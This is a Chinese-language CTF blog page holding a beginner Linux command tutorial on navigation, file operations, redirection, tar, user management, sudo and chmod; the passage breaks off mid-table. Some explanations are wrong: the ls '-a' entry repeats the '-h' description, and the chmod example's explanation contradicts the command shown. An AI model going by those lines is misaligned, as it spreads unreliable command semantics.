<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> CTF</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">CTF</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['欢迎来到f14g的博客', '临渊羡鱼，不如退而结网', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-2023-ctfshow愚人杯"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/" class="article-date">
  <time datetime="2023-04-06T15:08:28.844Z" itemprop="datePublished">2023-04-06</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
   
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-Linux基础"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/"
    >Linux基础</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2023-03-22T13:48:28.000Z" itemprop="datePublished">2023-03-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Linux命令初体验"><a href="#Linux命令初体验" class="headerlink" title="Linux命令初体验"></a>Linux命令初体验</h1><h2 id="Linux命令终端介绍"><a href="#Linux命令终端介绍" class="headerlink" title="Linux命令终端介绍"></a>Linux命令终端介绍</h2><p>退出命令终端输入exit或者ctrl+d快捷方式退出命令终端</p>
<h3 id="设置命令终端窗口字体大小"><a href="#设置命令终端窗口字体大小" class="headerlink" title="设置命令终端窗口字体大小"></a>设置命令终端窗口字体大小</h3><p>设置命令终端窗口字体大小： </p>
<p>临时设置字体大小 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl + - :缩小字体 </span><br><span class="line">ctrl + shift + + :增大字体 </span><br></pre></td></tr></table></figure>

<p>持久设置字体大小 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在命令终端界面点击右键--&gt;配置文件首选项--&gt;文本--&gt;自定义字体</span><br></pre></td></tr></table></figure>

<h3 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h3><p>(root㉿kali)-[&#x2F;opt]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:用户名</span><br><span class="line">kali:表示主机名</span><br><span class="line">opt ：表示当前目录名</span><br></pre></td></tr></table></figure>

<h2 id="Linux命令体验"><a href="#Linux命令体验" class="headerlink" title="Linux命令体验"></a>Linux命令体验</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">who ：显示当前登录用户</span><br><span class="line">pwd（<span class="built_in">print</span> work directory）：显示当前目录</span><br><span class="line">cd (change directory): 切换目录</span><br><span class="line">cd ~ : 切换到用户工作目录</span><br><span class="line">tree :查看文件列表</span><br><span class="line">ls ：查看文件列表</span><br><span class="line">	ls -l</span><br><span class="line">ifconfig（interface config）查看网卡配置信息</span><br><span class="line">linux查看ip ： ifconfig</span><br><span class="line">window查看ip： ipconfig</span><br><span class="line">ip地址有ipv4和ipv6两个版本， 目前主要使用ipv4</span><br><span class="line">ping ：测试主机间的连接情况</span><br><span class="line">主机可以用ip地址或者域名来描述</span><br><span class="line"> 比如: ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.6</span></span><br><span class="line">       ping www.baidu.com</span><br><span class="line">clear： 清除命令终端内容</span><br><span class="line">ctrl+L :快捷方式清除命令终端内容</span><br><span class="line">uname ：显示操作系统信息 </span><br><span class="line">	uname -r</span><br><span class="line">    uname -a</span><br><span class="line">uname -r ：查看linux内核版本发行号 </span><br><span class="line">exit： 退出或注销用户</span><br><span class="line"></span><br><span class="line">shutdown ：关闭系统</span><br><span class="line">	shutdown –r now :重启系统</span><br><span class="line">	shutdown –h now :关机</span><br><span class="line">	shutdown –h +<span class="number">5</span> :<span class="number">5</span>分钟之后关机</span><br><span class="line">	shutdown –c :取消预定的关机</span><br></pre></td></tr></table></figure>

<h2 id="Linux命令格式"><a href="#Linux命令格式" class="headerlink" title="Linux命令格式"></a>Linux命令格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">command[-options][parameter]</span><br><span class="line"></span><br><span class="line">command:命令名，比如：who,pwd</span><br><span class="line">[-options]:选项，可以有零个、一个或者多个选项，多个选项可以合并，比如使用的 -r 就是选项</span><br><span class="line">[parameter]:参数，可以有零个、一个或者多个参数，比如：ping 192.168.1.6， cd ~  这些都是参数</span><br><span class="line">[]代表可选</span><br></pre></td></tr></table></figure>



<h2 id="使用Linux命令的小技巧"><a href="#使用Linux命令的小技巧" class="headerlink" title="使用Linux命令的小技巧"></a>使用Linux命令的小技巧</h2><h3 id="命令补全"><a href="#命令补全" class="headerlink" title="命令补全"></a>命令补全</h3><p>当输入的字符足以确定某个命令或者某个文件时，只需按Tab键就可以自动补全该命令或者剩下的命令</p>
<h3 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h3><p>使用上下箭头查看已经使用过的历史命令</p>
<p>使用history命令查看已经使用过的命令</p>
<p>​		！+序列号可以执行对应的命令   注意！和序列号之间没有空格</p>
<h3 id="终止命令的执行"><a href="#终止命令的执行" class="headerlink" title="终止命令的执行"></a>终止命令的执行</h3><p>ctrl+c：终止命令的执行</p>
<p>测试top命令查看系统执行效果:[lijun@192~]$top</p>
<h3 id="查看命令帮助方式"><a href="#查看命令帮助方式" class="headerlink" title="查看命令帮助方式"></a>查看命令帮助方式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--<span class="built_in">help</span></span><br><span class="line">   eg:uname --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">man命令</span><br><span class="line">man命令是manual的简写，表示查看指定命令的使用说明书</span><br><span class="line">使用格式：man命令名</span><br><span class="line">例如：</span><br><span class="line">man uname</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>操作键</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>空格</td>
<td>显示下一屏的信息</td>
</tr>
<tr>
<td>回车</td>
<td>显示下一行信息</td>
</tr>
<tr>
<td>q</td>
<td>退出</td>
</tr>
</tbody></table>
<h1 id="Linux常用命令1"><a href="#Linux常用命令1" class="headerlink" title="Linux常用命令1"></a>Linux常用命令1</h1><h3 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h3><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321223051622.png" alt="image-20230321223051622"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">主要目录说明:</span><br><span class="line">/：Linux文件系统根目录，所有文件都是在该目录下面</span><br><span class="line">/boot</span><br><span class="line">	启动Linux时使用的一些核心文件</span><br><span class="line">/root</span><br><span class="line">	该目录为系统管理员（超级用户root）的主目录。</span><br><span class="line">/<span class="built_in">bin</span></span><br><span class="line">	binary的缩写，用来存放用户命令文件。</span><br><span class="line">/sbin</span><br><span class="line">	s就是Super User的意思。这里存放的是系统管理员使用的系统管理命令文件。</span><br><span class="line">/etc/</span><br><span class="line">	存放系统管理所需要的配置文件。</span><br><span class="line">/dev/</span><br><span class="line">	dev是Device(设备)的缩写。该目录下存放的是设备文件，在</span><br><span class="line">Linux中访问外部设备的方式和访问文件的方式是相同的。</span><br><span class="line"></span><br><span class="line">/home</span><br><span class="line">	用以存放普通用户的主目录。在Linux中，每个用户都有一个自己的目录，一般以用户的账号命名</span><br><span class="line">/home/用户名</span><br><span class="line">	某普通用户的主目录，假如用户名是pz，则/home/pz则为该用户的主目录，可简写为~</span><br><span class="line">/opt</span><br><span class="line">	可选文件和程序的存储目录。该目录主要被第三方开发者用来简易地安装和卸装他们的软件包。</span><br><span class="line">/mnt</span><br><span class="line">	该目录中通常包括系统引导后被挂载的文件系统的挂载点。</span><br><span class="line">/usr/ ...包括与系统用户直接有关的文件和目录</span><br><span class="line"> /usr/X11R6：X Window的目录；</span><br><span class="line">/usr/<span class="built_in">bin</span>：存放着许多应用程序；</span><br><span class="line">/usr/sbin：存放root超级用户使用的管理程序；</span><br><span class="line">/usr/lib：存放一些常用的动态链接共享库和静态档案库；</span><br><span class="line">/usr/src：存放源代码，Linux源代码就存在这个目录中。</span><br><span class="line">/usr/local：这是提供给一般用户的</span><br><span class="line">/usr目录，在这里安装一般的应用软件；</span><br></pre></td></tr></table></figure>

<h3 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h3><h4 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h4><p>绝对路径：是指从根目录&#x2F;开始的路径</p>
<p>相对路径：是指从当前目录开始的路径</p>
<h4 id="使用cd命令切换目录"><a href="#使用cd命令切换目录" class="headerlink" title="使用cd命令切换目录"></a>使用cd命令切换目录</h4><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>使用cd命令切换目录</td>
<td>切换到指定目录</td>
</tr>
<tr>
<td>cd ~ (波浪线)</td>
<td>切换到当前用户的主目录</td>
</tr>
<tr>
<td>cd ..</td>
<td>切换到上一级目录</td>
</tr>
<tr>
<td>cd .</td>
<td>切换到当前目录</td>
</tr>
<tr>
<td>cd -</td>
<td>切换到上一次目录</td>
</tr>
</tbody></table>
<h3 id="查看目录的文件列表信息"><a href="#查看目录的文件列表信息" class="headerlink" title="查看目录的文件列表信息"></a>查看目录的文件列表信息</h3><p>文件信息:</p>
<p>当创建一个文件的时候，系统保存了有关该文件的全部信息包括：文件的名称、文件的位置、文件类型、文件长度、文件的拥有者、i节点、文件的修改时间、文件的权限等</p>
<p>命令：ls</p>
<table>
<thead>
<tr>
<th>命令选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>以列表方式显示use a long listing format</td>
</tr>
<tr>
<td>-h</td>
<td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td>
</tr>
<tr>
<td>-a</td>
<td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td>
</tr>
</tbody></table>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224221903.png" alt="image-20230321224221903"></p>
<p>文件类型</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224302825.png" alt="image-20230321224302825"></p>
<p>文件权限</p>
<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224321300.png" alt="image-20230321224321300"></p>
<p>提示：</p>
<p>1.选项之间可以组合一起使用</p>
<p>2.-h选项一般结合-l一起使用</p>
<p>3.文件与目录名前添加   .  ，用于隐藏文件</p>
<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(当前目录是rh用户的主目录)</span><br><span class="line">1.以相对路径与绝对路径切换(cd)到用户主目录( /home/rh)</span><br><span class="line">cd /home/rh</span><br><span class="line">2.以相对路径与绝对路径切换(cd)到根目录下的opt子目录(/opt)</span><br><span class="line">cd ../../opt</span><br><span class="line">cd /opt</span><br><span class="line">3.使用ls -l命令查看用户主目录的内容</span><br><span class="line">ls -l /home/rh</span><br><span class="line">ls -l ~</span><br></pre></td></tr></table></figure>

<h3 id="创建、删除文件及目录命令"><a href="#创建、删除文件及目录命令" class="headerlink" title="创建、删除文件及目录命令"></a>创建、删除文件及目录命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch  文件路径/文件名:创建指定文件</span><br><span class="line">mkdir   目录名:创建目录(文件夹)</span><br><span class="line">	选项：p级联创建目录</span><br><span class="line">rm     文件\文件夹:删除指定文件</span><br><span class="line">  选项：r：递归删除目录及其内容</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前目录是kali用户主目录</span><br><span class="line"><span class="number">1.</span>在当前目录创建info.txt文件</span><br><span class="line">	touch info.txt</span><br><span class="line"><span class="number">2.</span>在当前目录创建CTF文件夹</span><br><span class="line">	mkdir CTF</span><br><span class="line"><span class="number">3.</span>在CTF文件夹下创建a.txt文件</span><br><span class="line">	touch ./CTF/a.txt</span><br><span class="line"><span class="number">4.</span>删除用户主目录info.txt文件</span><br><span class="line">	rm ~/info.txt</span><br><span class="line"><span class="number">5.</span>删除CTF文件夹</span><br><span class="line">	rm -r ~/CTF</span><br></pre></td></tr></table></figure>

<h3 id="复制、移动文件及目录命令"><a href="#复制、移动文件及目录命令" class="headerlink" title="复制、移动文件及目录命令"></a>复制、移动文件及目录命令</h3><p>cp : 拷贝文件、拷贝目录</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拷贝文件</span></span><br><span class="line">cp  源文件 目标路径/目标文件名</span><br><span class="line">	<span class="number">1.</span>如果不指定目标文件名，使用源文件名</span><br><span class="line">	<span class="number">2.</span>如果目标文件存在，覆盖原来文件</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">拷贝目录</span><br><span class="line">cp -r 源目录 目标目录</span><br></pre></td></tr></table></figure>

<p>mv:移动文件、移动目录、重命名，move</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#移动文件</span></span><br><span class="line">mv 源文件 目标路径/目标文件名</span><br><span class="line">	<span class="number">1.</span>如果不指定目标文件名，使用源文件名</span><br><span class="line">	<span class="number">2.</span>如果目标文件存在，覆盖原来文件</span><br><span class="line"><span class="comment">#移动目录</span></span><br><span class="line">mv 源目录 目标目录</span><br><span class="line"><span class="comment">#重命名：</span></span><br><span class="line">mv 源文件名 目标文件名(在同一级目录下)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当前目录为用户主目录</span><br><span class="line">1.在当前目录创建info.txt文件</span><br><span class="line">	touch info.txt</span><br><span class="line">2.在当前目录创建CTF文件夹</span><br><span class="line">	mkdir CTF</span><br><span class="line">3.在CTF文件夹下创建a.txt文件</span><br><span class="line">	touch ./CTF/a.txt</span><br><span class="line">4.拷贝info.txt到CTF目录下</span><br><span class="line">	cp info.txt ./CTF</span><br><span class="line">5.对a.txt文件移动到用户主目录下，且重命名为b.txt</span><br><span class="line">	mv CTF/a.txt /home/kali/b.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="重定向与管道命令"><a href="#重定向与管道命令" class="headerlink" title="重定向与管道命令"></a>重定向与管道命令</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">重定向</span><br><span class="line">把原本输出到屏幕上的内容，输出到文件中(文件不存在，则新建)，这就是重定向重定向命令：</span><br><span class="line">&gt;:覆盖模式重定向、</span><br><span class="line">&gt;&gt;:追加模式重定向</span><br><span class="line">管道命令</span><br><span class="line">|：管道的功能是将前一个程序的输出作为后一个程序的输入</span><br><span class="line">wc：word count：单词统计</span><br></pre></td></tr></table></figure>

<h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat:查看文件内容</span><br><span class="line">more：分屏查看文件内容，按空格切换到下一屏</span><br></pre></td></tr></table></figure>

<p>练习</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>把历史命令history输出的内容写入到用户主目录的myfile.txt文件中</span><br><span class="line">history &gt; myfile.txt</span><br><span class="line"><span class="number">2.</span>把/根目录下的文件列表追加到用户主目录的myfile.txt文件中</span><br><span class="line">ls / &gt;&gt; myfile.txt</span><br><span class="line"><span class="number">3.</span>用ls显示/目录的目录和文件，并且分屏显示</span><br><span class="line">ls / | more</span><br><span class="line">ls / | wc</span><br><span class="line"><span class="number">4.</span>分别用cat和more命令查看 /etc/passwd的内容</span><br><span class="line">cat /etc/passwd</span><br><span class="line">more /etc/passwd</span><br></pre></td></tr></table></figure>

<h1 id="Linux常用命令2"><a href="#Linux常用命令2" class="headerlink" title="Linux常用命令2"></a>Linux常用命令2</h1><h3 id="文件打包压缩命令tar"><a href="#文件打包压缩命令tar" class="headerlink" title="文件打包压缩命令tar"></a>文件打包压缩命令tar</h3><p>tar命令可用于压缩解压文件，好比windows的winRAR</p>
<p>语法格式：</p>
<p>tar[选项]文件或者目录</p>
<p>tar选项</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>创建新的打包文件</td>
</tr>
<tr>
<td>-v</td>
<td>显示打包或者解包的文件的详情</td>
</tr>
<tr>
<td>-f</td>
<td>使用打包文件或者设备,这个选项是必选项，一般放到所有选项后面</td>
</tr>
<tr>
<td>-z</td>
<td>用gzip格式来压缩或解压缩文件(.gz)</td>
</tr>
<tr>
<td>-j</td>
<td>用bzip2格式来压缩或解压缩文件(.bz2)</td>
</tr>
<tr>
<td>-x</td>
<td>解包</td>
</tr>
<tr>
<td>-C</td>
<td>解压到指定目录</td>
</tr>
</tbody></table>
<p>gz格式压缩和解压:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩后的名字 .tar.gz 要压缩的文件和目录</span><br><span class="line">tar -zxvf 压缩包的名字 .tar.gz -C 要解压到的目录</span><br></pre></td></tr></table></figure>

<p>.bz2的压缩和解压缩格式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf 压缩后的名字 .tar.bz2 要压缩的文件</span><br><span class="line">tar -jxvf 压缩包的名字.tar.bz2 -C 要解压到的目录(目录需要存在)</span><br></pre></td></tr></table></figure>

<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="用户分类"><a href="#用户分类" class="headerlink" title="用户分类"></a>用户分类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">超级用户(管理员)</span><br><span class="line">	该用户具有所有管理权限，UID=<span class="number">0</span></span><br><span class="line">系统用户</span><br><span class="line">针对特定的系统服务而开设的用户，系统用户不能用于登录，UID范围<span class="number">1</span>-<span class="number">999</span></span><br><span class="line">普通用户</span><br><span class="line">为了让使用者使用Linux系统资源而建立的户，UID范围<span class="number">1000</span>--<span class="number">65535</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看用户<span class="built_in">id</span>命令:<span class="built_in">id</span>[用户名]</span><br><span class="line">选项： -u(查看用户uid) -g(查看用户gid) -G(查看用户所在所有组的<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>

<h4 id="用户、组相关的配置文件"><a href="#用户、组相关的配置文件" class="headerlink" title="用户、组相关的配置文件"></a>用户、组相关的配置文件</h4><p>配置文件</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;passwd&#x2F;</td>
<td>用户信息库</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;group</td>
<td>用户组信息库</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;shadow</td>
<td>用户认证信息</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;gshadow</td>
<td>用户组认证信息</td>
</tr>
</tbody></table>
<h4 id="用户管理-1"><a href="#用户管理-1" class="headerlink" title="用户管理"></a>用户管理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">添加用户</span><br><span class="line">useradd [选项 参数] 用户名</span><br><span class="line">选项：</span><br><span class="line">-d ： 指定用户主目录默认的主目录</span><br><span class="line">/home/kali</span><br><span class="line">-M ：不创建用户主目录</span><br><span class="line">useradd CTF</span><br><span class="line">-s ： 指定新用户登录后使用的shell，默认是/<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">设置用户密码</span><br><span class="line">passwd 用户名</span><br><span class="line">修改用户属性</span><br><span class="line">usermod [选项 参数] 用户名</span><br><span class="line">删除用户</span><br><span class="line">userdel 用户名</span><br><span class="line">选项</span><br><span class="line">-r:同时删除用户主目录</span><br></pre></td></tr></table></figure>

<h3 id="sudo命令-super-user-do"><a href="#sudo命令-super-user-do" class="headerlink" title="sudo命令 super user do"></a>sudo命令 super user do</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo 以超级用户身份执行某条文件命令</span><br><span class="line">格式：sudo 当前用户要执行某条命令</span><br></pre></td></tr></table></figure>

<h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>用于修改文件权限</p>
<h4 id="文件列表中权限查看"><a href="#文件列表中权限查看" class="headerlink" title="文件列表中权限查看"></a>文件列表中权限查看</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 rh rh 6 7月 1908:43 b.txt</span><br><span class="line">文件的权限分为3组，</span><br><span class="line">每一组由三个字母组成（rwx-）</span><br><span class="line">1.rw-</span><br><span class="line">文件属主用户对文件的权限</span><br><span class="line">2.rw-</span><br><span class="line">文件属主用户的同组用户具有的权限</span><br><span class="line">3.r--</span><br><span class="line">其他用户具有的权限</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322204030351.png" alt="image-20230322204030351"></p>
<h4 id="字母法"><a href="#字母法" class="headerlink" title="字母法"></a>字母法</h4><p>命令格式：chmod MODE[,MODE]…FILE…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod u+r a.txt</span><br><span class="line">针对a.txt文件，属主用户增加读权限</span><br><span class="line">chmod u=rW,g=r,o=- b.txt</span><br><span class="line">针对b.txt文件，属主用户设置读和写权限，同组的用户设置读和写的权限,其他用户增加读权限</span><br></pre></td></tr></table></figure>

<p>角色说明</p>
<table>
<thead>
